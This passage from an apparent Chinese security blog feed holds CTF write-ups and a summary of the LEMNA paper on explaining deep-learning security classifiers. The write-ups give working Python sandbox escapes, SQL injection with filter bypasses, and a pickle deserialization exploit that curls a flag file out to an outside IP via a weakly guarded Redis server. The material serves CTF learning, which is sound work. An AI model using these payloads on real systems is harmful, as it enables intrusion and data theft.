class="number">10870198964186987138989651624057552405853366954080463316431710442091837631287759912193054100505356356476481503550009625275319473929512195371174525538642232600176213853601253377888749818545192155785873323173291991086758912490744417777560275318548708479769299122462125768416235737869558154549710389717852257846</span></span><br><span class="line">solve(Y**<span class="number">2</span>*(iqmp<span class="number">-1</span>)+Y*(ipmq+iqmp-phi<span class="number">-2</span>)+ipmq*phi-phi==<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>容易计算出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y=110759942750329561983364096770824818957156636845110590823134362698749612147788955083351174879972411435569300696393151260960779092387966200431706198509584768247841937719219850118991339268977853455607397866025870712323459278215127588375709815956587698977630219989552045686550681692693762584298742938231996726336</span><br></pre></td></tr></table></figure></p><p>那么即可利用y，计算出x，即可得到p和q，然后写出解密脚本:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">Y = <span class="number">110759942750329561983364096770824818957156636845110590823134362698749612147788955083351174879972411435569300696393151260960779092387966200431706198509584768247841937719219850118991339268977853455607397866025870712323459278215127588375709815956587698977630219989552045686550681692693762584298742938231996726336</span></span><br><span class="line">p = Y+<span class="number">1</span></span><br><span class="line">phi = <span class="number">11177929896833318778267064419554047209804133035532602158237892469506082395935495256139136112194510151728917586404919115707761109072628761295860181662822356164160284726297946695851442119129722147684494637497443200139538149832495961915450185804086755272971387407998204100589137627495400914243828434106078332327997903842841517071021248147779935078071506489655500155896938283840729728572328660647233974344849571246788826036265850539775145330135792207209473452843737567371694666658091855216070403504619639510901644370971614286091867701992201923071041178318790575030522483839410855929335515391080189720203086802888683798400</span></span><br><span class="line">X = phi/Y</span><br><span class="line">q = X+<span class="number">1</span></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x3ce4e91042f61e3b03537d825e7619a02b3f729a91e2de4fb724b95cabe8fb2a7a92c4270025d93aed94f1726ca761083328a7784806e1467f0bc204ef95484ce6b0d207574c6dba4fa91664db4c787e3df517bcfc370a0c5eed8a70b45be8d1e757a9d40eb410e66d2110ac9ece435f76d71e134e2bdbe565e8853e1100ae276211c2b9c49219bca8805ff697dcf84be00b071c3be01f35ba9a4ea1d8ef2c69044982a7fc021d2f6f93b8755948a606a8a376e74d995f439aeeb844ecf678a189916adca406197a1d2eaf2abe84ae6e794560537bcde43a1504f135874d5de9e0a2d95093e4ba7a87641e769e46a911c94ff60525b21c9c709068a89808b6bf</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure></p><h2 id="被嫌弃的python的一生"><a href="#被嫌弃的python的一生" class="headerlink" title="被嫌弃的python的一生"></a>被嫌弃的python的一生</h2><p>该系列有3道题，都是python继承链考察，难度也逐渐递进。</p><h3 id="上"><a href="#上" class="headerlink" title="上"></a>上</h3><p>在看python继承链时，我们得先了解一下内置方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">instance.__class__</span><br><span class="line">The class to which a class instance belongs.</span><br></pre></td></tr></table></figure></p><p>比如:<br><img src="/images/2019-12-14-11-33-28.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class.__bases__</span><br><span class="line">The tuple of base classes of a class object.</span><br></pre></td></tr></table></figure></p><p>比如：<br><img src="/images/2019-12-14-11-35-46.png" alt=""><br>此处basestring是 str 和 unicode 的超类（父类），也是抽象类。<br><img src="/images/2019-12-14-11-36-33.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class.__subclasses__()</span><br><span class="line">Each new-style class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive.</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-14-11-38-43.png" alt=""><br><strong>subclasses</strong>可以列举一个类的子类，此时我们能看到刚才出现的basestring和int。<br>所以简单总结一下：<br><strong>class</strong>：查看属于哪个类<br><strong>base</strong>：查看该类的父类<br><strong>subclasses</strong>：列举该类的子类<br>那么当我们想要使用继承链攻击时，我们先使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__</span><br><span class="line">&lt;type &apos;list&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>再利用<strong>base</strong>上跳到object:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>然后再列举object下的子类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print [].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure></p><p>再寻找其中是否含有危险类，例如file任意读文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__.__base__.__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>那么利用写出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print [].__class__.__base__.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure></p><p>题目中由于flag被过滤，那么使用拼接bypass:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print [].__class__.__base__.__subclasses__()[40](&apos;fl&apos;+&apos;ag&apos;).read()</span><br><span class="line">fductf&#123;python_is_the_best_language&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-13-23-47-26.png" alt=""></p><h3 id="中"><a href="#中" class="headerlink" title="中"></a>中</h3><p>我们查看源码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_type</span><span class="params">()</span>:</span></span><br><span class="line">    type_dict = get_dict(type)</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__bases__'</span>]</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__subclasses__'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_func_code</span><span class="params">()</span>:</span></span><br><span class="line">    func_dict = get_dict(FunctionType)</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">'func_code'</span>]</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">'__closure__'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">builtins_clear</span><span class="params">()</span>:</span></span><br><span class="line">    blackList = [<span class="string">'open'</span>,</span><br><span class="line">                 <span class="string">'file'</span>,</span><br><span class="line">                 <span class="string">'eval'</span>,</span><br><span class="line">                 <span class="string">'execfile'</span>,</span><br><span class="line">                 <span class="string">'compile'</span>,</span><br><span class="line">                 <span class="string">'__import__'</span>,</span><br><span class="line">                 <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> __builtins__.__dict__.keys():</span><br><span class="line">        <span class="keyword">if</span> mod <span class="keyword">in</span> blackList:</span><br><span class="line">            <span class="keyword">del</span> __builtins__.__dict__[mod]</span><br></pre></td></tr></table></figure></p><p>我们看到题目删除了<strong>import</strong>函数，那么我们将无法导入任何python模块，同时题目删除了<strong>subclasses</strong>，那么我们在使用继承链中调用子类将变得非常困难。<br>但是我们不难发现，我们依然可以使用reload函数。而reload函数用于重新载入之前载入的模块。<br>那么我们可以借助reload，来重新载入<strong>builtins</strong>，那么其删除的函数将会恢复：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)</span><br></pre></td></tr></table></figure></p><p>我们做个实验，首先删除<strong>import</strong>方法：<br><img src="/images/2019-12-14-11-19-31.png" alt=""><br>可以发现，我们在调用import的时候，已经无法正常使用，此时我们重新载入<strong>builtins</strong>：<br><img src="/images/2019-12-14-11-20-31.png" alt=""><br>发现已可以正常使用import：<br><img src="/images/2019-12-13-23-47-58.png" alt=""><br>那么即刻获取flag。</p><h3 id="下"><a href="#下" class="headerlink" title="下"></a>下</h3><p>我们查看源码，发现题目还给我们留下了stderr：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    stderr.write(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">    inp = raw_input()</span><br><span class="line">    cmd = input_filter(inp)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">exec</span> cmd</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        stderr.write(<span class="string">"An error has occurred!\n"</span>)</span><br></pre></td></tr></table></figure></p><p>那么我们还能用stderr.write进行指定内容输出：<br><img src="/images/2019-12-13-23-49-12.png" alt=""><br>那么研究一下stderr：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print help(sys.stderr)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-14-12-01-40.png" alt=""><br>我们stderr是类file下的，那么我们可以利用<strong>class</strong>创造出file：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print sys.stderr.__class__</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>然后即可进行任意文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.stderr.__class__(&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure></p><p>然后利用stderr.write将内容带出，写出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stderr.write(stderr.__class__(&apos;flag&apos;,&apos;r&apos;).read())</span><br></pre></td></tr></table></figure></p><p>得到flag：<br><img src="/images/2019-12-13-23-48-22.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目还是比较容易的，主要面向新人以及拓宽知识面。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近学校有招新赛，难度比较低。于是节选了几道稍微有点意思的题目记录一下。&lt;/p&gt;
&lt;h2 id=&quot;你再注试试&quot;&gt;&lt;a href=&quot;#你再注试
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; LEMNA &amp; Explaining Deep Learning based Security Applications</title>
    <link href="http://skysec.top/2019/12/07/Paper-Summary-LEMNA-Explaining-Deep-Learning-based-Security-Applications/"/>
    <id>http://skysec.top/2019/12/07/Paper-Summary-LEMNA-Explaining-Deep-Learning-based-Security-Applications/</id>
    <published>2019-12-07T07:45:50.000Z</published>
    <updated>2019-12-24T12:36:39.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次带来的是一篇2018 CCS Best Paper，主要阐述的是作者实现了一种解释深度学习决策原因的方法：LEMNA。这一方法明显弥补了在安全领域解释方法的稀缺和低保真率的问题。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>众所周知，深度学习在图片分类上有着比较显著的核心地位，比如：<br><img src="/images/2019-12-07-15-52-34.png" alt=""><br>当我们input一张图片给计算机后，计算机可以根据这张图片，输出描述该图像属于某一特定分类的概率的数字（比如：80% 是机器人、15% 是人、5% 是电视机）。<br>而这一目的的实现，目前一般采用的是CNN（卷积神经网络）。<br>但是，如果我们需要将相同的目的，转换至安全领域呢？比如恶意软件的分类：我们input一个文件给计算机，计算机是否可以根据这个文件的信息，输出该文件属于某一特定分类的概率的数字呢？比如80%是正常软件、20%是恶意软件。<br>答案是显然的，但这里我们一般采用的是RNN（循环神经网络）。<br>那么CNN和RNN有什么区别呢？<br>我们可以这样简单理解，对于CNN：</p><ul><li>CNN的假设：人类的视觉总是会关注视线内特征最明显的点。</li><li>CNN神经网络是模仿人类处理信息的过程，提取关键信息特点<br>而对于RNN：</li><li>RNN的假设：事物的发展是按照时间序列展开的，即前一刻发生的事物会对未来的事情的发展产生影响</li><li>处理过程中，每一刻的输出都是带着之前输出值加权之后的结果</li></ul><p><img src="/images/2019-12-07-15-57-35.png" alt=""><br>那么为什么对于安全领域，我们偏向于使用RNN也一目了然，很显然程序前后之间是存在关联的，前一段代码势必会对未来执行的代码产生影响，而RNN很好的能将这一点表述出来。<br>那么决策的解释方法又是什么呢？<br>举个简单的例子，对于CNN，我们刚才说到，对于我们input的机器人图片，计算机会给出这样的分类概率：80% 是机器人、15% 是人、5% 是电视机。这样的结果和我们所期望的大致一致。但是如果计算机给出的分类概率为：99%是电视机，那么就会出现分类错误。<br>那么是什么原因导致我们的深度学习分类决策失误呢？这里就需要使用解释方法来进行分析，找到错误，并纠正错误。<br>举个简单的例子：<br><img src="/images/2019-12-07-16-45-17.png" alt=""><br>比如图片a中，为什么会把图a左边这张图判定为橘子，是因为图a右边高亮的像素点。<br>又比如图片b中，为什么会把这一段话判定为消极语句，是因为图b中红框高亮的一段话。<br>只有拥有比较完善的解释方法，我们才可以充分信任分类器做出的决策，否则如果其决策对我们不透明，那么其分类结果也将变得不可信。<br>而对于解释方法，我们可以大概分为两类，一种为白盒模式，一种为黑盒模式。<br>对于白盒模式，我们需要提供模型架构、参数、训练数据集，而对于黑盒模式，我们需要不断改变input，观察output，并得出影响决策的关键原因。<br>那么很明显，白盒模式更加适用于CNN模式，同时大多数工具也是基于白盒模式，开发给CNN使用的。而黑盒模式更加适用于安全领域。</p><h2 id="研究问题"><a href="#研究问题" class="headerlink" title="研究问题"></a>研究问题</h2><p>本篇paper的研究问题，就在于如何解释深度学习在安全领域上分类决策的原因。深度学习在安全领域也逐渐开始有比较广的应用，但是目前没有一个很好的解释方法可以解释其决策的原因，就会使得我们丢失对分类器的信任。<br>由于CNN在图片分析上的广泛使用，现有的大多数解释方法全都是供CNN使用。但我们前面提到过，在安全领域，RNN才是更适合的方法。<br>我们不可能将为CNN设计的解释方法，用于RNN上，这样势必只能获得比较低可信度的结果。<br>作者首先分析了一下现有的几款解释方法：<br><img src="/images/2019-12-07-16-07-24.png" alt=""><br>不难发现，对于黑盒解释方法，只有LIME有所涉及，但是其对RNN / MLP的支持并不是非常好，同时其采用的是线性回归模型。<br>那么什么是线性回归模型呢？<br><img src="/images/2019-12-07-16-08-51.png" alt=""><br>比如这样一只猫的图片，影响该图片被分类为猫的因素肯定有很多，通常可考虑如下的线性关系式：<br><img src="/images/2019-12-07-16-10-12.png" alt=""><br>在改变x的时候，我们可以大约探测出图中函数f的边界，这样就可以帮助我们得知，改变哪些x的时候，会对分类产生关键的影响。而其对应的特征，就是影响决策的关键特征。<br>但是作者发现，这样的方式，在对于复杂模型的时候，并不适用，存在比较大的误差：<br><img src="/images/2019-12-07-16-13-49.png" alt=""><br><img src="/images/2019-12-07-16-15-03.png" alt=""><br>我们在用该方式处理复杂问题时，它会将每一个特征视为独立的，但我们知道这些特征势必是有相互关联性的，比如一只猫不可能只有耳朵，没有脸。<br><img src="/images/2019-12-07-16-15-14.png" alt=""><br>其最佳的方法不应该选用线性回归模型，还应该使用混合回归模型：<br><img src="/images/2019-12-07-16-15-44.png" alt=""><br>简而言之，就是由多个线性回归模型组成的模型，这样才能更好的探测出函数f的边界。<br>所以为了解决线性回归模型的弊端问题，作者尝试引入了混合回归模型。而为了解决特征之间的相互依赖关系，作者使用了fused lasso(惩罚最小一乘回归)。如此一来，将混合回归模型和惩罚最小一乘回归二者结合，即可比较完美的解决LIME的弊端问题。</p><h2 id="现实评估"><a href="#现实评估" class="headerlink" title="现实评估"></a>现实评估</h2><p>作者使用了混合回归模型和惩罚最小一乘回归二者结合的解释方法，主要分析了如下两种情况：<br>1、解释逆向工程中查找函数开头的决策原因：即为什么把这个位置标记为函数开头。<br><img src="/images/2019-12-07-16-24-27.png" alt=""><br>例如在图片中，我们将这种图判定为猫的主要原因，是因为右边高亮的像素点，这是解释器需要给出的原因。<br>而在二进制文件分析中也一样：<br><img src="/images/2019-12-07-16-25-06.png" alt=""><br><img src="/images/2019-12-07-16-26-18.png" alt=""><br>我们为什么把83认定为函数开头位置，是因为其前面90的位置。这也是解释器需要给出的原因。<br>2、解释PDF恶意文件分类的决策原因：即为什么把这个PDF判定为正常文件/恶意文件。<br>作者设置了如下数据集：<br>对于逆向工程，作者使用了2200个binary文件，在x86下利用gcc的4种不同优化模式（O0, O1, O2, O3）进行编译。<br>然后将数据集中70%用于训练，30%用户测试。<br>对于PDF文件，作者使用了4999个恶意文件和5000个正常文件，并从中提取了135个特征点。并将其也按照7：3分为训练集和测试集。<br>在结果上，我们可以发现拥有相当高的准确度：<br><img src="/images/2019-12-07-16-29-52.png" alt=""><br>除此之外，作者还对自己的LEMNA的解释保真度进行了评估，即决策的重要原因找的对不对。<br>为此作者设计了两大组实验：<br>第一组实验，作者使用了公式进行评估，即均方根误差（Root Mean Square Error）：<br><img src="/images/2019-12-07-16-31-48.png" alt=""><br>pi表示目标分类器分类为target的概率、pi-hat表示使用混合回归模型分类为target的概率。<br>那么RMSE越小，说明决策边界找的和目标分类器越一致。<br>作者使用LIME作为参照体：<br><img src="/images/2019-12-07-16-32-55.png" alt=""><br>我们可以发现，作者提出的LEMNA的边界寻找准确度比前人工作LIME在逆向工程上高出了将近10倍，在PDF恶意文件分类上高出了5倍。这也充分证实了混合线性模型对比线性模式的优势。<br>第二组实验，作者使用了如下3个小实验：<br><img src="/images/2019-12-07-16-34-46.png" alt=""><br>比如用图片举例，我们input进去一张图片(a)，解释器告诉我们将这张图片分类为毛衣，而不是鞋子的关键原因：图片（b)（关键像素已由红点高亮）<br>那么我们的3组实验分别为：<br>图片c：我们将解释器得出的关键像素去除，再丢入分类器，如果分类器将其判定为非毛衣的可能性与我们去除关键像素的个数成反比，那么说明解释器解释的越正确。<br>图片d：我们仅留下关键像素，同时加入一双鞋子做干扰，如果分类器将其判定为毛衣的可能性与我们加入关键像素的个数呈正比，那么说明解释器解释的越正确。<br>图片e：在图片d的基础上去除干扰，在我们加入关键像素点越少的情况下，如果分类器已经可以很高概率将其判定为毛衣，那么我们的解释器解释的越正确。<br>结果也证实了，作者的工具拥有最高的效率（图中红线为作者工具）：<br><img src="/images/2019-12-07-16-39-39.png" alt=""><br>对于图片c模式的测试下，作者在仅去除5个关键点后，分类器的分类成功率就已经在一个非常低的水准了，而其他前人的方法还在一个比较高的成功率，这充分说明了，作者的解释方法找到的关键因素才为保真度非常高的关键因素。<br><img src="/images/2019-12-07-16-41-21.png" alt=""><br><img src="/images/2019-12-07-16-41-26.png" alt=""><br>同理，对于图片d和图片e模式下的测试，作者在仅用5个关键特征的情况下，就已经让分类器达到了比较高的准确率，这也同样说明了作者的工具解释出的关键特征，具有更高的保真度。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总得来说，本篇paper在安全领域的深度学习决策解释上填补了空缺，同时其解释的关键原因具有非常高的可信度，效果也是远好于前人设计的解释方法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本次带来的是一篇2018 CCS Best Paper，主要阐述的是作者实现了一种解释深度学习决策原因的方法：LEMNA。这一方法明显弥补了
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 SWPU CTF Web Writeup</title>
    <link href="http://skysec.top/2019/12/06/2019-SWPU-CTF-Web-Writeup/"/>
    <id>http://skysec.top/2019/12/06/2019-SWPU-CTF-Web-Writeup/</id>
    <published>2019-12-06T14:02:09.000Z</published>
    <updated>2019-12-07T02:49:26.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>12月比赛有点少，手有点生了，发现SWPU又开始了，还记得去年质量挺高的，于是来玩玩，下面是web的解题记录。</p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>随便注册一个用户进入，发现有广告发送的地方，随手测试：<br><img src="/images/2019-12-06-10-02-12.png" alt=""><br>点入发现触发了sql报错：<br><img src="/images/2019-12-06-10-02-05.png" alt=""><br>随手又试了一下：<br><img src="/images/2019-12-06-10-02-19.png" alt=""><br>发现确实可以闭合：<br><img src="/images/2019-12-06-10-02-26.png" alt=""><br>首先尝试联合查询注入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp：</span><br><span class="line">0&apos; union select  1,2,3,&apos;a&apos;=&apos;a</span><br><span class="line"></span><br><span class="line">waf:</span><br><span class="line">0&apos;unionselect1,2,3,&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p>发现空格会被替换成空，于是尝试用如下方式bypass:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;/**/union/**/select/**/1,2,3,&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p>但发现列数过多，随机放弃这个方法，选择报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/database()),0x7e))/**/||&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-45-46.png" alt=""><br>测试过程中发现，or被过滤，我们无法获取表名和列名，那么首先查看一下mysql版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/version()),0x7e))/**/||&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-46-42.png" alt=""><br>发现版本很高，思考mysql新特性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select/**/table_name/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()</span><br></pre></td></tr></table></figure></p><p>但发现mysql被过滤，继续查找新特性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_auto_increment_columns</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-50-22.png" alt=""><br>爆表：<br><img src="/images/2019-12-06-12-52-18.png" alt=""><br>尝试爆表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=&apos;web1&apos;),0x7e))/**/&amp;&amp;&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-12-58-21.png" alt=""><br>发现成功获取表名，但是无法爆列名，但是可以使用无列名注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select i.1 from (select 1,2,3 union select * from flag)i</span><br></pre></td></tr></table></figure></p><p>即可无需列名注入指定列数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.2/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-13-03-40.png" alt=""><br>发现第二列是flag，那么注第3列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.3/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;&apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-06-13-03-56.png" alt=""><br>成功获取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;Simple_Double_Injectin&#125;</span><br></pre></td></tr></table></figure></p><h2 id="python简单题"><a href="#python简单题" class="headerlink" title="python简单题"></a>python简单题</h2><p>随便注册一个账户登入：<br><img src="/images/2019-12-06-13-15-36.png" alt=""><br>发现提示是Redis，随机测试一下：<br><img src="/images/2019-12-06-13-20-56.png" alt=""><br>发现需要授权，那么随手尝试弱密码：<br><img src="/images/2019-12-06-13-21-22.png" alt=""><br>结果直接就进去了，我惊呆了= =，看看里面有啥：<br><img src="/images/2019-12-06-13-41-08.png" alt=""><br>随便读一个内容：<br><img src="/images/2019-12-06-13-21-40.png" alt=""><br>那么不难想到，就是构造序列化，携带session访问时触发，进行任意命令执行。<br>查看自己的session：<br><img src="/images/2019-12-06-13-41-32.png" alt=""><br>那么利用脚本写入一个session：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#</span><br><span class="line">import cPickle</span><br><span class="line">import os</span><br><span class="line">import redis</span><br><span class="line"></span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;curl -d &apos;@/flag&apos; 106.14.114.127:23333&quot;&quot;&quot;</span><br><span class="line">        return (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=&apos;114.67.109.247&apos;, port=6379, db=0, password=&apos;password&apos;)</span><br><span class="line">r.set(&quot;session:1013122a-70cc-4251-b3e0-05d5731b3ae3&quot;, s)</span><br></pre></td></tr></table></figure></p><p>然后刷新页面，flag即可获得：<br><img src="/images/2019-12-06-13-40-20.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;u6frAFrJoWXnf4w6w0Q1-By@mYz&#125;</span><br></pre></td></tr></table></figure></p><h2 id="easy-python"><a href="#easy-python" class="headerlink" title="easy_python"></a>easy_python</h2><p>进入题目，发现有上传功能，但显示权限不足：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Permission 